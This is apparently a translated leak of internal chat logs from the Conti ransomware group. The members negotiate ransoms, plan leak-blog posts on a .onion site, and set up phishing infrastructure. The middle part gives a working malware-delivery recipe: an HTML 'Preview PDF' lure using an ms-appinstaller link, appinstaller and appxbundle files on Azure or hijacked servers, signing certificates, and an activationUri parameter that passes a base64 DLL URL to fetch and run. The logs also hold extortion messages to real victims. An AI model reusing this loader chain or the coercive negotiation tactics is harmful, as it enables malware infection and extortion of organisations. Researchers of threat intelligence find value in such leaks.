today i finish (at the weekend i did not have time to do everything, i had to rewrite a lot)
either later tonight or tomorrow morning will be ready to start)
forgot again )
hello
here?
what do you think to answer SDIGC
ocean, I did not even start today because of this
do not want to raise the price above 1.130.000
hi
Yeah, right.
so it doesn't go anywhere.
listen, i replied to your message late on friday, you didn't answer me, one thing to decide
[03.12.2021 23:01:08] <best> sorry it took me so long to reply, I had to step away quickly

I am currently monitoring html and internal components
also pass the bots to the guys to work (but I think I will ask someone else to do this, so it would be faster)

on html let's think:
essentially, I always update 2 parts - html lend (there is a link protection inside the lend) and appx files (these files are what html lend points to)
i put the appx files on azure and sometimes mice delete the server on azure (when analysts complain) and so i have to update the html feed itself

To make it as competent as possible, ideally I would like to update only appx files without touching the html lend
for example, you could make a lend to send a request to a server when you open it, and get an answer with a link to the appx files and add them to the button on the lend
it will be possible to change the host appx files without changing even the html lend itself
[03.12.2021 23:01:45] <best> or work like now when the mikes delete the azur server, i update the html lend and update the appx files and then i send you the html lend and you change it and everything runs
I read it. Yeah.
html is fine with me, i uploaded it.
7
2+2+3=?
so as long as the same works on the second option?
when they deleted, i re-upload everything and send you the link, right?
I don't send you a link, I send you a new html feed.
Yeah. .
I in turn update my new html link that I spammed and it works again.
Do a blog on them.
ok)
+
hello
here?
will you be able to do the crypto shk today?
х64
hi
here?
sdgs question.
come on
+
See
well
there's a fucking negotiator out there.
I'm thinking of sending something like that.
I'll send it to you in 10 minutes)
So, you won't raise your offer anymore?
If it is too hard for you, I will ask in another way: can we already publish ALL your data?

P.S. for the company top management:
Your negotiator looks like a low-class bot. He says the same words and don't do anything to solve the situation. We advise you to fire him, he is useless at all. We both know that you wouldn't restore the data, no one did it yet. We both understand consequences of the data publication. Hope you understand that we offer much more easy solution.

So, our word is next:
LAST PRICE is 2,600,000. We warn ahead - there will be no more discounts.
Any attempt to decrease the price will result in a price increasing.
We are tired of this useless time spending. Think several times now.
Give them the last price
now
Read .
Let's make it $3,000,000.
Let's give it a shot.
But that's the endgame.
Let's do .
Yeah. .
I'm ready.
It's either yes or no.

gone
It's a bouza.
so it's the french, i don't have them on the list you posted yesterday. https://group.chantellelingerie.com is their website, right?

[00:19:42] <fire> hi again)
ahhh

it's not hard for me
well it didn't come to me

Yeah, I guess so.
Why didn't you ask?

I'm fine.
Hi.
I just took it off and went to sleep.)

I'm getting my ass kicked, like always.)
Didn't even know why.
I know what's going on.

and how through acrobat you can open such links?)

hmm
but how can you open such links through acrobat?)
even it's interesting)

[17:17:33] <best> hmm
how can you open such links through acrobat?)
[17:17:36] <best> even it became interesting)
need to figure out how to check to see what the problem might be and how it works)
is it Adobe mail client or what?
acrobat
and send me an example of a letter or a letter of some kind

I'll put on the acrobat, I'll finish your ribbons first.
Hey, did you get in touch with everyone yesterday?
I'm skippy as always.

you can try to put this html directly into the letter, see how it will work and whether they will put it)
I'm thinking how to do it.

bot seemed to go well, and then silence again
need to check the lend
There was an error accessing the file from the Internet. Try to download and open the file locally.
[18:27:00] <veron> bots seemed to go well and then silence again
[18:27:06] <veron> check for band
is the band broken or already jammed?
a minute
yeah, first one got busted
very fast this time
it's time to get off the azur, it's bullshit
they lock too fast
shit (!
can you update the link?
i think there are no bots (
i'll make a quick one for the spare one
yes
come on
do you have to have everything on azura ?
I was just saying that everything should be stored on shells, they take longer to break
If I understood the logic correctly.

good thing I made a spare.)
i had to get around the corp in the first place
i wanted to get the corps to work well. but since your letters are flying too and you're not on azure, i think you should just leave it alone.
i'm thinking about leaving these fucking servers and other nuances, and giving them all to you along with the lends)
i'm thinking about the right thing to do, i think today i'll decide that point too

hi
I like lend in general
want to inbox well clicked, infected
the volume can be done
Let's think about what we need to optimize so we don't have to deal with blocks like this.
but we need to think about a killable lend and quickly recovering ))))
))))
I need to keep everything on the shelves.
draw me a diagram again )
i don't know how to load what from where, i don't really know how to load it yet
either the main files separately on the shelves, and html separately
it takes 1-5-7 days for them to reach the administrator in Thailand
i have a feeling that i clicked your scripts to death ))))
there are a lot of clicks and hits
21,773к


in an hour and a half.
Look, I'll tell you a little problem and you tell me if you can solve it)

there are 3 parts
html, appxinstaller and appxbundle
my loadir and your load is loaded in the appxbundle file, but to run it this nice, you need an appinstaller file
And for the appinstaller to understand which appxbundle you want it to load, inside the appinstaller file you will find the following line
Uri="https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appxbundle" />
this link is static (i.e. you can't insert a php script to give this file away, it must refer to appxbundle by file extension)

and there is also this link (in the appinstaller file):
Uri="https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appinstaller"
Here the appinstaller refers to itself (because it has to be on the web exactly to load)

Well the html file itself, which has such a button inside:
<a href="ms-appinstaller:?source=https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appinstaller" id="btn" target="_self">Preview PDF</a>

As you can see, the appinstaller refers to itself and to the appxbundle file, and the html file refers only to the appinstaller file

So, I wanted to host everything on shells, but there is a small problem: dynamically in html I can get the current url where the html file was opened (for example https://shell.com/index.html)
and if i put an appinstaller file next to it, i can use JS to take the current url, trim it and appinstaller file and link to it
so the first issue is solved

but the appinstaller has to reference the appxbundle file and itself, so you have to change the references in it too
Okay.
Prviet. Horse takes. Reverse while Zeus works out.
Notes put
hi
pongyal
Where's Horse?
I didn't see him on line.
does zeus have a lot of bots?
and here's a question - can you automatically detect the url where the shell is, change e.g. links in index.html (1 link to appinstaller, https://shell.com/file.appinstaller), in appinstaller file (2 links, one to itself https://shell.com/file.appinstaller and one to appxbundle file, https://shell.com/file.appxbundle) and then upload them
?
Yes there is also
Online
of course I can
just need to tweak it
Yeah
where it is))
funny
There's work to be done
♪ the boots are coming ♪
the nets are coming
ah, well, I understand why there are no launches)))
this time they withdrew the intermediate certificate in 3 hours))))
dums didn't have time to work out
how fucking fast of course))
i told you ((
stop )
?
stop)
not to fuck it up.
i texted him.
let's get it right and we'll be pouring normally and quietly)
we'll set up your lanb and my spamming will fuck them up.)
they're gonna be fucked.
we just need to tune it up a little bit.)
really.)
the bots are coming in fast, you can tell.
if i don't wait for him
Ask
if I don't wait for him ask him if he takes all the bots
in the admins
veyron
and what are the results in terms of nets
that take.
ok.
let's see what comes out
out of all this.
It's all over the news.

Yeah. .
about the emote
And flash banding.
♪ tweeting all over the place ♪
))
[19:05:07] <veron> sure I can
[19:05:15] <veron> just tweak it

that's great
Then let me today, instead of fucking with lends and azur damn, just give you a more detailed description of TOR, prepare scripts and show you where and what to change, and you from your side file autocorrect files and filling to shells, and that's all)
Horse what
you will host absolutely everything on shells
did you change your toad?
in the fire of paranoia?
Stop spamming now, I'll read it again in peace.
Yes, I did.
the only nuance you just saw is they can revoke the interim certificate (before you and i had enough for 2 days, now i had enough for my tests yesterday + spill today for a couple of hours)
I'll get some coffee.
((
and then i have to update the appxbundle file itself with the new certificate
but there are no links in it, so I can send you the new one immediately, and you just pour it over the shelves by the same names and that's it, it keeps on pouring :)
well yes, that's what i was talking about in the first place
trampich, VWkYI95vHZxIHk07m6dZiLCHeP0OA7b4Jl5ywtTJ2RGGJwWW95KiGUcrCLG0qZB
want to know the amount
but see, to throw it to you like this, and I need you to fix your system to process these 3 files and then fill in the shell)
I'll write back in 30 minutes.
sorry i was hoping to catch up with us today ))))
then there will be no issues with azur and lend me
I will keep an eye on the servers, clean files and update you periodically appxbundle files to continue pouring)
prepared )
everything will be, i am sure)
we will catch up with more than a thousand pure yusa tightly)
and i need your advice, how much SRY should i put percent approximately?
hahahahaha
he mouthed off to me
how he's not afraid of anyone
offline.
and then the toad changed.
)))))))0
Fucking hilarious.
because they're so fucked up.
but now you can make something spammy give them a dll)
))
would like to know
how he's doing it
killer
or like this
at some %
a lot of comments?
in the admins
what did he take to work
tell me please
I haven't looked in a while.
I'll check it out.
Fuck, i'll try.)
Theoretically it'll work.
you changed the link everywhere to the last land you posted, didn't you?
Yeah. .
i'll try now and i'll tell you in 5 minutes if it works or not)
I need to discuss html, I'll do it
OK)
1. <a href="ms-appinstaller:?source=https://documentreviewmain.z13.web.core.windows.net/lneddhlhna.appinstaller" id="btn" target="_self">Preview PDF</a>
this one change in html ?
further tell me where else ?
ms-appinstaller:?source=https://documentreviewmain.z13.web.core.windows.net/lneddhlhna.appinstaller"

here we point to the local folder, next to it will be your two files
There's not a single comment in the first admin.
I'm looking at the second one.
Check with Hors and Dave.
https://i.imgur.com/aEnyme5.png
if they put comments.
and where.
you got a dll busted, by the way.
))) plz
right now)
thanks
ok
oh, fuckin' stop.)
Horse said today he hasn't tagged
it's on the second backend.
for a minute
I've seen them take a couple of bots to work.
I know they do.
There was an error accessing the file from the internet. Try downloading and opening the file locally.
Yes I see))
just upgraded the file and they kicked my server azur)
Anyway, it will be very cumbersome to update now, to be honest
ok (
see
<daiverjm> talked to him about it yesterday)
yes, i will tag the bots today, no time
yes, let's go back to html
let's go one by one
1. html
Yep
What's there to change?
just this:
1. <a href="ms-appinstaller:?source=https://documentreviewmain.z13.web.core.windows.net/lneddhlhna.appinstaller" id="btn" target="_self">Preview PDF</a>
[19:21:27] <veron> 1. <a href="ms-appinstaller:?source=https://documentreviewmain.z13.web.core.windows.net/lneddhlhna.appinstaller" id="btn" target="_self">Preview PDF</a>
[19:21:37] <veron> this one change in html ?
no problem
This one should essentially be:
<a href="ms-appinstaller:?source=https://shell.com/file.appinstaller" id="btn" target="_self">Preview PDF</a>
woo
I can even do it now without, correspondence.
Horse said today that he hasn't marked it yet.
I've seen them take a couple of bots to work
<daiverjm> talked to him about it yesterday)
Yeah, I'll tag the bots today, I don't have time
file.appinstaller - the name you give to the appinstaller file (you can name it whatever you want, as long as it has the .appinstaller extension at the end)
steamroller will swear at you too...
then what
?
let me send you appinstaller and appxbundle files as examples and show you what to change :)
why don't you send it to me and let's check it out ?
)))

https://privatlab.com/s/v/8Ra0n4J437ImGnOr99G4
download, open file jajnedhneb.appinstaller
text editor only
))
then ?
the installer opened
look, there are 2 Uri links in it
the first one:
Uri="https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appinstaller"
aha
change here
original:
Uri="https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appinstaller"
what to change to:
Uri="https://shell.com/file.appinstaller"
no problem
next )
and there is also a second Uri
Uri="https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appxbundle" />

it has the same situation
original:
Uri="https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appxbundle" />
What to change to:
Uri="Uri="https://shell.com/file.appxbundle" />
ok
then
That's it, that's all you need to do :)
I'll do it manually now.
I will do a new html, will it work?
If they revoke the certificate or lock the appxbundle file (something inside lock there, which is kinda rare), you will need to fill a new appxbundle file and in appinstaller change one more line:
Publisher="CN=Kolpin LLC, O=Kolpin LLC, S=Moskva, C=RU"

ischolarly:
Publisher="CN=Kolpin LLC, O=Kolpin LLC, S=Moskva, C=RU"
new:
but here I will not tell at a glance, because here the data of the certificate and only at the moment of transferring appxbundle I will tell you what data to write here :)
ok i will put it there let's see, at the moment is the certificate alive?
Nope, it's a dead cert
let me give you the appxbundle file with the new cert and give you the new publisher line, let's check it out :)
let's do it, I'll post the files
come on
new publisher:
Publisher="CN=Neyros LLC, O=Neyros LLC, S=Sankt-Peterburg, C=RU"
6wFTRHg34f%$#ahg$agE
https://privatlab.com/s/v/YOj57MolxAu4BlYM66BM
this one's got the right certificate.
just theoretically, you can check it now, if everything works - you can even update your shell with the installer quickly and installs will go)
doing
I'll be gone for 7 minutes.
i'll eat quickly, i haven't eaten anything :(
the steamroller is swearing at you too...
an explicit indication is needed here?


Uri="https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appxbundle" />

can I do that?


Uri="ttps://tienda.alfrio.cl/Navajo/EMLpuzI7tf/" />
let's check without explicit.
I didn't check that, explicit or not.
but most likely explicit as well.
https://tienda.alfrio.cl/Navajo/EMLpuzI7tf/
Put it in your html.
Check
<?xml version="1.0" encoding="utf-8"?
<AppInstaller
	Uri="https://tienda.alfrio.cl/Navajo/EMLpuzI7tf/"
	Version="1.7.0.0" xmlns="http://schemas.microsoft.com/appx/appinstaller/2017/2">

		Uri="http://jkla.com.br/wp-content/a5kV/" />
</AppInstaller>
I did it that way
please check
minute
Nope, that didn't work.
can you specify the files explicitly?
sec
yes
paranoid
hi
how are you
The bots are coming.
you're commenting?
it means you have to rewrite
thought you could redirect it )
Hi
It seems to pull the appinstaller file fine, but appxbundle does not
Uri="http://jkla.com.br/wp-content/a5kV/" />
there seems to be a hitch)
Not sure, maybe it's not working :(
sec
the link works
the link yes, but it seems to be waiting for an explicit reference to the appxbundle file
not this kind of return)
you can fix it now ?
i'm all set up to work, i'm afraid of screwing up (
i don't have anything to fix.
it's a system requirement, not because i want to :(
ok
the installer is fine.
The appinstaller file probably pulls it, but the appxbundle does not...
that is, it pulls it up:
Uri="https://tienda.alfrio.cl/Navajo/EMLpuzI7tf/"

but apparently not this one:
Uri="http://jkla.com.br/wp-content/a5kV/" />

to host appinstaller + appxbundle + dll files side by side - i managed to do it last night))
you can do it that way
but you need to either host the dll with a static path on the shell (so the installer knows which path to take the dll), or make it something like a parameter https://shell.com/path/?dll and when I tap on it, you give the dll to me)
hey

I'll send it to you in 5 minutes.

Hi.
Yeah. .
Send it to .
You don't have to wait.
They should see the blog right away.
Okay, by the way they have a good date.
in fact the blog should be pulled to them automatically for the chat
so they can see the link right away.
I already made a tree file for them if they ask for it.
and we're just throwing it in the chat like indians ((
Yeah, okay.
Well, as it is.
Indians or not, it works.
it's not supposed to be like that
Well, you run your software, we'll do what you want.

- if we put in the .appinstaller
        Uri="https://srcdatastorage.z13.web.core.windows.net/jajnedhneb.appxbundle?param1=https://some/some/1.dll" />

then bundle will be able to get https://some/some/1.dll and download it?
Yeah, pretty much.
It's a little different but the link looks different.
I'll show you how.
You won't have to change the line in the appinstaller file, but even in the html feed)
ms-appinstaller:?source=https://shell.com/file.appinstaller&activationUri=custom-params:?data=https://host.com/1.dll
ok
This is how you would put it on the button in the feed
&activationUri=custom-params:?data=https://host.com/1.dll
that's what it adds)
fit two ?
try somewhere else.
would that make it easier for you?
yeah
How are the nets?
super)
ok
in work, the report will be collected today)
in the admin panel i left a comment on all that work
the next upload will be in a group to determine them not to overload)
hi, how are you doing with social networking?
Saw the page. You have 270 GB or just that data? If you have 270 GB, where is it?

yes
coming soon
They're just writing it off.
I would throw the blog at their shoulders.
this is why i'm always not in favor of writing 10 times the amount of data
How'&nbsp;d you take 270 GB? That seems like a lot. Not sure how you could'&nbsp;ve done it.
let's in the future remove that altogether, replacing it with words like a lot, big, etc.
hi
here
?
help
here
I'm listening)
help please
trampich as always
he'll get it up and then go fuck himself.
Come here. How'&nbsp;d you take 270 GB? That seems like a lot. Not sure how you could'&nbsp;ve done it.
LL_main
We only have 27GB.
He fucking wrote 10 times that.
it looks like the company didn't have that much.
That's what the fuck you're talking about?
what do you think?
I have a couple of options on what to write.
1. Either they got it wrong and we're really only 27.
or two.
Here's a part of your data file tree that's on one of our servers.
So there you go.
now it's just a bit difficult to get out, when as i understand they did not have so much data))
Go ahead, it's not a problem.
What do you say?
what to broadcast?
koo
just a company-- have you seen rhubarb?
3.5 billion.
You can't screw this up.
and you already started with this.


and we charged them 25 million
fuck
Trampy said not to discount at all
and then you fucked up the whole thing
so i'm consulting with you.
What do you mean don't discount?
he doesn't answer)
should i tell them to go fuck themselves?
literally.
no
At the very least.
the bare minimum.
Oh, fuck.
Oh, shit.
But that's not the point.
I'm just trying to get out of here.
What do you say to the second option?
I'd give you a list and say part of it.
or offer me your own.
Well, that's what I'm for.
Only then if they ask for another sheet.
I'll be sitting on my ass.
and then I can get out of the way.
Okay.
ok then
[19:55:33] <fire> then it's okay to leave
[19:55:44] <fire> like we've already given enough prouf
[19:57:40] <fire> I just don't understand why fuck up
[19:57:49] <fire> it's one thing when there is no date
[19:57:56] <fire> and not to fuck around
agree
ok
I've already started
there as it goes
gut
no time at all
fuck all sides
by the way, today i told tramp that i have been working with him for 1.5 months, is it not time to raise it to 1%
he said he would talk to Dreshev
and what do you think they decided?
ahah
they didn't fucking decide.
They left it at 05.

They told me to go fuck myself.
♪ said be happy about it, too ♪
fuckin'
♪ and I don't give a fuck that I work for three people ♪
well, you better be ready.
I'm leaving in the spring.
and i get three hours of sleep a night at the most.
I won't be alive till spring, bro.
fuck him with that fucking schedule.

That's why I'm gone till New Year's Eve.
and then I'll be gone in January.
Then I guess that's it.
almost to the end.
You can't make all the money.
And health is one thing.
No money can buy it.
that's true.
and they're Jews
I don't think they'll give me a raise.
I'll leave, go to Manki's
♪ to take my place ♪
It's a fucking great team.
We'll work it out later.
He's riding me.
And he's unhappy that I'm out for a couple of hours in the evening
while I'm picking up the kid from day care.
It's fucked up, yeah.
so i'm not really happy here, like i'm being used as an indian
i'm really starting to fuck up. i'm simultaneously shoveling terabytes of data, i have to do blogs for all companies at once, i post gigabytes of information to websites for those who have not paid, and i also have to manage to answer in all panels)))
for 0.5%.
they must be fucking laughing, they fucking found an indian
Fuck, we've got separate people doing this
but what the fuck do you need separate people for when there's an Indian?
So you do realize that the grid is big.
and you can't get much out of it.
Well, I understand... but not 10 times as much to say)))) well, with skippy consulted, decided to go as they went. there we'll see. because as I understand the company itself fucked up from such a volume and questioned whether they have so much data)
It means the approximate amount of data. I can give you a part of the file tree, if you want of your data to appreciate.
Give it to Skippy.
He'll do it.
They'll forget about the 270.
Okay?
That's what I was talking to him about.
before you wrote it.
They're too big for you.
Give it to Skippy.
You're the boss.
I told him everything.
That it was under his watchful eye.
They need to be gassed up, but no, I can provide you with a part of the file.
What kind of answers are these?
They need to be unloaded.
so i'll stay out of it, let him fuck it up
auf
yeah
Where the fuck is he?)
I'll learn a lesson at the same time.
that's on him.
That's it, I did my part.
now waiting for your side when you roll it out)
ok, i will, tell me how it will work from your side
OK, now I'll do the final testing on my side and describe it to you.)
my message can be hidden by the way, they haven't read it yet
I did!
Write something there please.
I hid my message.
They haven't had a chance to read it yet.
Now
write here please gXLy5m5Y5WPMpKVdSvacdMbEA5T81UcM34pC3WoyBweqeBFkIiCPdE4snQUA5lik, guys are waiting for the amount
by the way, there are multiplication modules, don't know if you know it or not, when loaded you can run these modules on the same day, they are updated every day
they work for both worrgrappe and domain
everything, it works for me)

Anyway, here's the scheme:
In the htmland in the link this:
 <a href="ms-appinstaller:?source=https://datastorefiles.z13.web.core.windows.net/cnmnghdaeo.appinstaller" id="btn" target="_self">Preview PDF</a>

it is now possible to pass special parameters to the .dll you want to load
so you can give different dll on different bands and divide it among your backends too

What the link looks like when you pass the link up to the .dll:
 <a href="ms-appinstaller:?source=https://shell.com/file.appinstaller&activationUri=custom-params:?data=https://host2.com/file.dll" id="btn" target="_self">Preview PDF</a>

And storing the files as we discussed - the html feed in one place, and the appinstaller and appxbundle files in another (as I said before, so that there is an explicit reference to them)
&activationUri=custom-params:?data=

this is the mandatory part, which cannot be changed, because it is a prescribed rule by mice and the installer statically parses it
I will also send you the appxbundle file and the certificate data
no more internal changes)
if you deleted shells from where you download the dll, I do not need to rebuild appxbundle file because the link there is not statically protected and is now passed from the link, where to download and run the dll
great) accepted)
if you want, you can pass the link to the .dll not in its pure form, but you can encrypt it in base64 for example, and I'll decode it and that's it)
but tell me now, because I need to do such things in software right now)
let's do it in base64, it's safer
I'll encrypt it
ok
then i will wait for a link encoded in base64 in the parameter data=
decode it, load the dll and run it like before
will you be able to roll it out today or on Mon?
or at the weekend?
i want to test it before pouring it out to see if it's ok)
I'm thinking Monday.
okay
If you make it, it would be nice to have the cmd commands thingy that I threw in by Friday
I'll try to get the links as soon as possible
because we need to get more uss done before the holidays
yeah
Another newbie.
You'll get your prize when you show up.

hi
rw0J6Ap3LZNfxsJyo6UpClQbrgD1dzRjxZLVZep0QQEFdl01ihbHIkEvZt91EvtA - this explains the amount
because they are lawyers and they pay
500 exactly from them
now they will start crying that they don't have that much
It's just that lawyers know how to understate their income
so they don't have to pay a lot of taxes.
There's a lot of dates.
They're here.

I don't know about that, just your experience.
because they pay almost everything.
Not almost, but all of them.
Well, the word "almost" at the end of.... doesn't sound good.

they are willing to pay 1k quickly
16:18

they need decryptors
16:18

The board is willing to go to a maximum of $1KK, which is what I provided to you.  Hopefully, they will understand.  The company revenue is under $100KK.  This is a not a large organization.   Let me know what you can do.  
16:18

But if you have data on their cyber insurance and maybe they have a lot of dereg in the account need a bank payment then I can bargain
16:19

I'll be online by 9 p.m. Moscow time
16:20

Go through the paperwork and see if there is insurance and bank statements
Okay. .
Let me know where you e-mailed them.
Right now it's .
but if you have their cyber insurance information and maybe they have a lot of dereg in their account I can negotiate.
you might want to go through their files.

tramp, if you don't trust me, you're an indian.)
yeah i already said that
http://continewsnv5otx5kaoje7krkto2qbu3gtqef22mnr7eaxw3y6ncz3ad.onion/wqKecF1B_The_Briad_Group
I made a blog on brade.
i'm gonna put it up.
tramp, if you don't trust me, you're an indian.)
 I don't get it.
You're always double-checking me.
Don't you trust me?
when such money and people come from the streets who have never seen such money, how can you trust them 1000%? i have been working here for over 15 years and have not seen anything else
so i'm sorry but i will always double-check
I told you from the start that for me the money is secondary, for me it's the people and the attitude that are important
That's normal!
I can't even say that for me the money is secondary, at least I'm sure I'm ok with it)
well, time will tell .
i looked at the blog on retorana
++
ok
id was not there ?
I do not understand the question.
what id ?
not even passports ?
no
date
no, didn't find
jr
ok
One photocopy and it's already expired.
And not the ID, but the bank card.
by the way, how much do you think you can really get off lemancorp?
maybe the negotiator should just say that you can shit your pants all you want, but we're not gonna go less than 5k and that's it
yeah
That's what I said to k55.
and I wrote the same to pantner in the next panel
That's good
I think this negotiator has already negotiated with us
and understands.
yeah
vOjdyhnt7ADeB867Pg5e1ANOWX40k3KndyNiyaRB1mwP0KMtHLnPeuVSj99huNzu
please identify
I'll do a blog on them
now
I found only medical, dental and life
ok
Why can't you figure it out?
We'll find out soon, my server crashed where the targeting info is.
I would've figured that out a long time ago.
Oh, I'm sorry, I didn't know.
Ok, I'm in the way

Publish at 5-10% of the dates they have
tomorrow night
today is the day off
+
+
Well, they wrote it off.
and what to do?
now
maybe ask them to introduce themselves as a company
where did they sign off?
I don't see it.
vOjdyhnt7ADeB867Pg5e1ANOWX40k3KndyNiyaRB1mwP0KMtHLnPeuVSj99huNzu
into the panel
those that are not identical
ah
Yeah.
It's okay to wait.
Let's find out who they are.
Okay. .
This is Conti a Team.

Introduce yourself to who we are talking to from your company.
Just text them something like this for now.
+
vOjdyhnt7ADeB867Pg5e1ANOWX40k3KndyNiyaRB1mwP0KMtHLnPeuVSj99huNzu - I raised the server, on these guys input info from my partner, how will come to identify them.
at resolvedev?
no
Ok, fine.
We'll wait for him.
+
,
?
hi
no money yet.
I'll throw it in as soon as it drops.
sterna
haven't seen it.
not in a fuckin' week!
i have to load something else, not the tricks...
the second one is gone
10 days)
rrrrr

Listen, what if I drew the wiring...
You decide.
Decide .
can you fit it in?
What's the load?
Who is it?
I don't think they do.

on the dock.
yeah
We'll have to come up with something to sting.
Social engineering...)
What the hell do you think of?
See?
here you have to have a wide audience
and there was a time when a man wrote to me and he knew that it was for FRG
and he gave a lead in German and everyone was hooked
think about what to write or draw so that people would press the button
find a pschiolg)
psychologist

+ it's a good idea to put a password
really
it's not a problem
password
although I think the avers have learned how to bypass it
and that the main thing is to click and enter the password
not likely
What's wrong?
I tried it with a password.
It's confidential. People like that use the office...
They would have already done it.
The avers are going fucking nuts.
I'll be there tomorrow morning.
ok
this SVL company
price is asking)
Trampych, yes, I know I'm busy, but at least name the amount and I'll send it to them.
there
Damn internet failed(
I can't see what you wrote, please repeat it when you do
I'll tell you
Go to
and the panel can be deleted?
there's a negotiator asking
SVL <http://SVL.COM>.COM 19m
he's already in the second
They have rhubarb.
I'll tell you how much we'll bet them.
Yeah, come on.
800
ok
++
I've been dueling and blocking that chat room.
it's the negotiator who came
lf
I texted you)
Yeah. Yeah.
I saw
Look for the financial documents )
you're referring to )
)))
there's no financials at all.
just accounts and stuff.
why do we need financial documents?
we don't need any.
i won't give him anything
Here?
Hi.
Will you text him?
Yeah.
i'll text him
let me see.)
hey
yo
ti kto?
ok
Yes, we gave you the not even standard discount, but probably in vain, because you're starting to repeat the old song again. you will see all the documents after we will publish it, if we do not achieve the result. Our price is $5,500,000. You must explain this to the company. Now it's your problem.
What are you doing there?
Are you even here?
Yeah. .
i'm talking to someone who's been in touch with this negotiator for over a year now by mail)
))
ok
he says it's about the lvy
we got the lavy.
yeah
http://continewsnv5otx5kaoje7krkto2qbu3gtqef22mnr7eaxw3y6ncz3ad.onion/GV8PuAI7_LAVI
Yeah, I know.
He says there were some offers from the negotiator.
They don't answer.
Like, the guy's coming over. Ask him.
Wow, I had no idea.)
We'll find out.
when he comes.
Well, I don't know either.
There's some fucked up shit going on.
it's all supposed to be in the dashboard.
And it should be clear.
not behind some fucking backstage.
Yeah, right.
I just really don't like it when there's no transparency.
so I think the rest is fucked up.
i don't like it either
yeah i'll talk to reshayev
make your software faster bro
so what's the negotiator's answer?
Is my answer okay?
I'll tell him right now.
Yeah. .
Send it to
+
Fuck, there's a new one.
n7fsW0zDZVIj0wxxe7G7qpFDcxJI1TQfNJLYXCLPU1G5zQtwXCVTRNGF3xrDvx51
can you tell?
and also, tramp, do we not have any SVL date??? I see the folder is empty at all
yeah
Right now
Yes, we have a date on it.
I'll give you the SVL date tomorrow.
Okay. .
I just need the date.
I already made a blog.
The date is only
so
Write to that fucking negotiator.
I'm writing
ok
I was expecting that answer.
I'll be right there.
Tell him if you put the dialogue there, I'll delete the chat and block you, and we'll publish you as a lover.
You tell them the price, you went to them and told them our terms, we are not interested in your opinion
Tell them we'll just publish their information.
Yeah, that's pretty much what I said.
It's your job to get ahead of the story.
ю
Fucking
shit
It pisses me off.
that motherfucker who's on the phone with him is gone.
now i'd text him too
)))) take it easy, tramp.
it's alright
please identify the ID above
now
bitch
))
you hid ?
my message?
or did i accidentally
it looks like i accidentally)
If you publish 1 file of our data you will get nothing.
he's a pussy.
You accidentally hid it yourself.
Yeah, he's lying.
I didn't hide anything.
That's what I figured.

It just showed up two messages in a row.
Fucking
tell him you already offered 1k in the mail.
Why the fuck are you running this circus?
cause they're fucking around.
I was hard on him.
It's okay.
Or did you have to settle for 500k?
Fuck him.)
i'm sure he'll go now.
I don't even need any money from that motherfucker!
Fuck him!
these motherfuckers piss me off.
you know he fucking won't even talk to the company
Now the company's going to suffer
I made him do it
we'll see tomorrow, i'm not gonna post anything yet
i shouldn't have blocked that chat room
We're gonna charge them at least $1 million
bitch

Yeah. .
That's where you rushed it.
You should have kept it from them.
Yeah.
We need to find out how to get them out of the ban
You see that creep doesn't want to tell the company either
No way.
I asked
Just the new one.
Write to him tomorrow we will call the director of the company and we will call him for a conversation in a separate chat room
and continue the dialogue with him
Yeah. .
We don't like you, goddamn it!
that's more or less what i wanted to do
)))))))
but i enjoyed fucking that motherfucker up, i really did.
I love it.)
I'm looking at his correspondence, it's all right. I think I pissed him off.
I'm so fucked up that I'm gonna report him.)
Yeah yeah.
You should just piss him off.
You write and tell him that we'll call the company's management every day and tell them that you are a person who does not want to negotiate with us, if they do not want problems with claims from their own employees, they'll just forget about it.
Yeah, I'll write. As long as he's gone.
I pissed him off.
I'll go report it)
.
And he's a complete and utter wanker.
Yeah. Yeah.
i'm not gonna drop the market
♪ we've got to push it ♪
We'll crush it.
i'm sure. if it wasn't a negotiator, i'd be soft.
+
and this prick got what he deserved.
Yeah. Yeah.
No luck identifying the rookie?
I haven't signed up yet.
Okay.
All right, I'm done for the day, it's quiet.
I spent the weekend here)
LEMANSCORP
It's the same company.
So it's okay.
it can see and read?
Or hardly
in a bathhouse.
Okay, good luck. less nerves, no money can buy them))


Hi Max. I have nothing new so far. My friend did not help me in any way :(. We have to turn off the power in our house, they say from 11 o'clock, some maintenance work at the substation. So I'll probably be off in the afternoon.

i had a problem with my computer, i was setting up a new laptop and i fucked up my computer so it wouldn't run at all
i ran to get another laptop, i found a backup from september and it started up somehow
I tried as hard as I could to do it all quickly, but as a result, I have not slept here for 3 days, as soon as I set everything up - some weird stuff keeps popping up. The VPN did not start automatically, then I overreacted with the security that no programs were running, and now the whole fiasco came out...
I reinstalled the OS, VPN and all the software, all set up everything is ok. Started to run the virtuals - could not open C:\...VMware\x64\PXE-E100E.ROM (could not find the specified file) and then immediately could not open C:\...VMware\x64\PXE-BIOS.404.ROM (could not find the specified file)


Not one starts...
I panicked at first, worried that I would miss you and not catch you - and we had a paycheck today as planned. Then I couldn't fucking do anything, I got even more nervous - all my savings are in bits on one of the virtualisations... in general, it was terrible. I slept for 3 days for 10 hours at times while they were copying backups and installing the OS...
Anyway, i'm sorry, it won't happen again.
i was a dumb fuck when i got a new laptop - i wiped out all the work from the old one
i wanted to do better, i thought i would fuckin' set everything up on the new laptop, i put 2 wpn, i cut off everything that could sniff somewhere and so on, and i played hard to get it right

We have a decryptor for all your systems and a lot of interesting and sensitive data from your servers. Moreover, we can solve all your problems and point where to enhance your security systems. So you understand that your offer must be very satisfying. We are ready to make steps forward, but we will not give you a large discount.

if he really told him that if they pay by christmas then we'll bill them 8 million and if not then the price will go back to 30 million. will they agree? we just have 4 days left, if we don't start putting a date then we're losers and we don't keep our word. if we put a date then fuck it, we'll lose money and not a few) we'll probably have a dilemma
We'll have to consult with Trump.
Either we're gonna take them off the hook or we're gonna be stuck with them for who knows how long.
what do you think?

tramp says pull.

i'm not sure that's cool.
i'm pretty sure it's not great.
they can burn out after the holidays and that's it.

No, it's $185.

We are glad that you understand that your situation is not so sunny as it can be. Also, I think you understand that every day of negotiations will bring more and more losses, maybe even exponentially, so yes - you will gain a profit if you cooperate with us.

However, 900,000 USD is not a satisfying offer either. We said our word - we are not interested in such a numbers. Try your best and raise it.
Maybe we should say - offer bizkoe to 7 zeros?
